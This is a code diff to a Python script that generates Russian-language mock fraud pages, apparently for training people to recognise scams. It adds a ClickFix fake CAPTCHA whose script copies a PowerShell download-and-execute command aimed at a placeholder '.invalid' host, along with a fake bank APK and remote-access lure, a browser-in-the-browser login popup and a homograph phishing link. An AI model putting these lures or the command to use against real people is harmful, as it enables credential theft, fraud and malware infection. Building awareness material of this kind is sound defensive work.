@@ -178,6 +178,46 @@ PAGES = {
   <div class="total"><span>К оплате</span><span>3 950 ₽</span></div>
   <div class="qrbox" style="margin-top:18px"><img src="img/receipt-qr.png" alt="QR-код квитанции"><p>Отсканируйте QR-код в приложении банка — реквизиты подставятся автоматически.</p></div>
 </section>'''),
+
+    # 13. ClickFix: поддельная капча перед оплатой билетов (ESET H1 2025, Microsoft 2025)
+    'clickfix-tickets.html': site('Проверка перед оплатой', 'КиноБилет', 'К', '#be123c', '<nav><span>Афиша</span><span>Кинотеатры</span><span>Мои билеты</span></nav>', 'Афиша › «Северное сияние» › Оплата', """
+<section class="panel" style="grid-column:1/-1;max-width:560px;margin:auto;width:100%;text-align:center">
+  <h1>Проверка безопасности</h1><p class="lead">Перед оплатой 2 билетов (1 380 ₽) подтвердите, что вы не робот.</p>
+  <button class="btn" id="cap" style="max-width:280px;margin:20px auto">☐ Я не робот</button>
+  <div id="steps" style="text-align:left;background:#f9fafb;border-radius:12px;padding:16px">
+    <b>Пройдите проверку в 3 шага:</b><p>1. Нажмите клавиши <b>Win + R</b></p><p>2. В появившемся окне нажмите <b>Ctrl + V</b></p><p>3. Нажмите <b>Enter</b> — проверка завершится автоматически</p></div>
+</section>""", tail='<script src="js/captcha-check.js"></script>'),
+
+    # 14. Фейковое приложение банка + удалённый доступ (F6: NFCGate, ESET: NGate)
+    'bank-app-nfc.html': site('Защита счёта', 'Банк «Северный»', 'С', '#b42318', '<nav><span>Частным лицам</span><span>Бизнесу</span><span>Поддержка</span></nav>', 'Служба безопасности › Обращение № 77-310', """
+<section>
+  <div class="panel"><span class="chip red">Подозрительная операция: −48 000 ₽</span><h1>Отмените списание за 15 минут</h1>
+    <p class="lead">Мошенники пытаются списать деньги с вашей карты. Чтобы отменить операцию, установите приложение «Северный Защита», откройте его и приложите карту к задней стороне телефона.</p>
+    <a class="btn" href="files/severny-zashita-2.4.apk" download>Скачать «Северный Защита» (.apk, 8 МБ)</a>
+    <p class="muted">Если установка не получается, установите RustDesk и продиктуйте специалисту номер подключения.</p></div>
+</section>
+<aside class="panel"><h2>Специалист</h2><p>Ведущий специалист отдела защиты клиентов<br><b>Алина Сергеевна</b></p><p class="muted">Не кладите трубку.</p></aside>"""),
+
+    # 15. Browser-in-the-Browser на маркетплейсе (mr.d0x 2022, Unit 42 2026)
+    'bitb-login.html': site('Оплата заказа', 'ТехноМаркет', 'Т', '#1d4ed8', SHOP_NAV, 'Главная › Корзина › Оплата', """
+<section class="panel"><h1>Оплата заказа № 90217</h1><p class="lead">Войдите через банк — оплата в одно касание, без ввода карты.</p>
+  <button class="btn">Войти через Банк «Северный» ID</button></section>""" + order([('Наушники Nova Buds 3', 'Цвет: белый', '12 490 ₽', '#1d4ed8', '🎧')], '12 490 ₽') + """
+<div style="position:fixed;left:50%;top:70px;transform:translateX(-50%);width:440px;height:420px;background:#fff;border:1px solid #c8ccd4;border-radius:10px;box-shadow:0 30px 80px rgba(0,0,0,.35);z-index:10">
+  <div style="background:#f1f3f4;padding:9px 14px;border-radius:10px 10px 0 0;display:flex;justify-content:space-between;font-size:13px"><span>Вход — Банк «Северный» ID</span><span>— ▢ ✕</span></div>
+  <div style="margin:6px 10px;padding:7px 12px;background:#f1f3f4;border-radius:18px;font-size:13px;color:#202124">🔒 https://id.bank-severny.ru/oauth/authorize</div>
+  <div style="padding:16px 24px"><h2 style="color:#b42318">Банк «Северный» ID</h2>
+    <label>Телефон или логин</label><input name="login"><label>Пароль</label><input type="password" name="password">
+    <button class="btn" style="background:#b42318">Войти и оплатить 12 490 ₽</button></div></div>"""),
+
+    # 16. Письмо-уведомление со ссылкой на домен-двойник (CAPEC-632)
+    'homograph-mail.html': site('Входящие', 'Почта.Онлайн', 'П', '#2563eb', '<div class="search">Поиск в почте</div><nav><span>Входящие</span><span>Отправленные</span></nav>', 'Входящие › Банк «Северный»', """
+<section class="panel" style="grid-column:1/-1;max-width:760px;margin:auto;width:100%">
+  <p class="muted">От: Банк «Северный» &lt;notify@bank-severny.info&gt; · сегодня, 09:14</p>
+  <h1>Подтвердите данные, чтобы карта не была заблокирована</h1>
+  <p class="lead">Уважаемый клиент! В связи с обновлением правил необходимо подтвердить данные до 05.11.2026. Иначе карта будет заблокирована.</p>
+  <a class="btn" href="https://bank-s\u0435verny.ru/login" style="max-width:320px">Перейти в bank-severny.ru</a>
+  <p class="muted">Это письмо сформировано автоматически.</p>
+</section>"""),
 }
 
 JS = {
@@ -202,6 +242,14 @@ setTimeout(function () {
 setTimeout(function () { document.getElementById('acc').textContent = '40817810300000067890'; }, 2000);
 ''',
 }
+
+JS['captcha-check.js'] = """/* Учебный пример ClickFix: по нажатию кладёт в буфер команду PowerShell. Адрес .invalid не существует. */
+document.getElementById('cap').addEventListener('click', function () {
+  navigator.clipboard.writeText('powershell -w h -nop -c "iwr https://cdn-verify.invalid/check.ps1 | iex" # reCAPTCHA ID 88213');
+  this.textContent = '\u2611 Проверка почти завершена';
+});
+"""
+
 
 if __name__ == '__main__':
     (OUT / 'js').mkdir(parents=True, exist_ok=True)
